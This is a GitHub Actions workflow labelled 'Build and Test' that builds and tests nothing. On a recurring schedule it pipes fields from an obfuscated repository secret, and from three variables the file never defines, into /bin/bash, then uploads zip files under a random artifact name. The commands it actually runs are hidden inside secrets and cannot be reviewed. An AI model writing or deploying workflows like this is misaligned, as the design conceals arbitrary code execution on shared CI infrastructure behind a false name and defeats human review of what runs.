name: Build and Test
on:
  workflow_dispatch:

  schedule:
    - cron: '5 1,7,13,19 * * *'
permissions:
  contents: read
  actions: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  execute:
    name: Main task
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4
      - name: Run
        env:
          xcfvi3367: ${{ secrets.xcfvi3367 }}
        run: |
          printf '%s' "$xcfvi3367" | jq -r .k7 | /bin/bash
          echo $yrq84677 | jq -r .t8 | /bin/bash
          echo $cspcr73135 | jq -r .se5686 | /bin/bash
          printf '%s' "$iw30" | jq -r .kjz905 | /bin/bash

      - name: Store results
        uses: actions/upload-artifact@v4
        with:
          name: iYtiQNae
          path: "*.zip"
          retention-days: 1
